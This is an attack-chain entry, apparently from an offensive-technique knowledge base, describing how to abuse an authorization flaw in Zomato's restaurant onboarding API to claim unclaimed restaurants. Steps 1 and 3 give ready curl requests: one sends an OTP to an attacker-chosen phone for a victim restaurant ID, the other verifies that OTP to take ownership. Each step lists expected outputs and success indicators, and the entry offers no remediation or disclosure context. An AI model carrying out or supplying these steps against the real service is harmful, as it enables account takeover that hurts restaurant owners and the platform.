---
tags:
  - otp-manipulation
  - authorization-bypass
  - api-vulnerability
  - account-takeover
  - zomato
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Send-OTP-Request-with-Arbitrary-Phone-Number]]'
  - '[[procedures/Receive-OTP-via-SMS]]'
  - '[[procedures/Verify-OTP-to-Claim-Restaurant-Ownership]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Modify Authentication Process]]'
updated_at: '2025-12-14T17:28:44.241Z'
description: >-
  A multi-stage attack exploiting improper authorization in Zomato's restaurant
  onboarding API to manipulate OTP delivery and claim ownership of unclaimed
  non-delivery restaurants.
skill_level: intermediate
impact_level: high
id: 08ec223c-f598-4ff9-a41e-02ca4f5095a2
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Modify Authentication Process]]'
---
---

# OTP Manipulation for Unauthorized Restaurant Claiming in Zomato API

Multi-stage attack chain demonstrating a complete attack workflow exploiting OTP handling flaws in Zomato's restaurant onboarding API.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initiate OTP with Arbitrary Phone] --> B[Receive OTP on Attacker's Device]
    B --> C[Verify OTP to Claim Ownership]
    C --> D[Restaurant Takeover Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- SMS-capable mobile device

### Target Environment

- Web platform with access to Zomato's public API endpoints
- No specific ports required (HTTPS/443 implied)
- Services: SMS for OTP delivery
- Tech stack: HTTP/2, JSON APIs

### Initial Access Requirements

- Attacker must have a Zomato account with an email mapped to at least one restaurant (prerequisite for claiming)
- Knowledge of target restaurant ID (resId) for an unclaimed non-delivery restaurant
- Attacker's phone number for OTP receipt

## Detailed Attack Procedures

### Step 1: Initiate OTP Request
procedure: [[procedures/Send-OTP-Request-with-Arbitrary-Phone-Number]]

**Objective**: Send an OTP request for the target restaurant using the attacker's phone number, bypassing association checks.

**Instructions**: Use [[commands/curl-send-otp-request]] to POST to the OTP initiation endpoint with the attacker's phone details and the victim's restaurant ID.

```bash
curl -X POST https://www.zomato.com/restaurant-onboard-diy/v2/send-auto-claim-otp \
  -H "Content-Type: application/json" \
  -d '{"number": "ATTACKER_PHONE", "isdCode": "+91", "resId": "VICTIM_RESID"}'
```

**Expected Output**: JSON response with 'status': 'success', a 'requestId', and confirmation that OTP is sent.

**Success Indicators**:
- Response status is 'success'
- Valid 'requestId' returned for use in verification

### Step 2: Receive OTP
procedure: [[procedures/Receive-OTP-via-SMS]]

**Objective**: Intercept the OTP delivered to the attacker's phone, which was intended for the target restaurant.

**Instructions**: Monitor the attacker's mobile device for incoming SMS containing the 6-digit OTP from Zomato's SMS service.

**Expected Output**: SMS message with OTP code, e.g., "Your Zomato OTP is 123456. Valid for 5 minutes."

**Success Indicators**:
- OTP received on attacker's phone
- OTP is a valid 6-digit code

### Step 3: Verify and Claim Ownership
procedure: [[procedures/Verify-OTP-to-Claim-Restaurant-Ownership]]

**Objective**: Submit the received OTP to associate the attacker's email as the owner of the target restaurant.

**Instructions**: Use [[commands/curl-verify-otp-claim]] to POST the OTP and requestId to the verification endpoint, specifying the target resId.

```bash
curl -X POST https://www.zomato.com/restaurant-onboard-diy/v2/verify-auto-claim-otp \
  -H "Content-Type: application/json" \
  -d '{"verificationCode": "OTP_FROM_SMS", "requestId": "REQUEST_ID_FROM_STEP1", "resId": "VICTIM_RESID"}'
```

**Expected Output**: JSON response confirming successful verification and ownership mapping, e.g., 'status': 'claimed'.

**Success Indicators**:
- Verification succeeds without errors
- Attacker's email is now listed as owner/manager in the restaurant profile
- Target restaurant shows as claimed in Zomato listings

## Attack Chain Summary

### Key Achievements

1. Bypassed phone number validation to receive OTP for any unclaimed restaurant
2. Verified manipulated OTP to hijack ownership without legitimate credentials
3. Achieved full control over restaurant listing, enabling modifications or deletions

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Modify Authentication Process]] Modify Authentication Process

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Persistence]] Persistence

---

*Last updated: 2023-10-01T00:00:00Z*
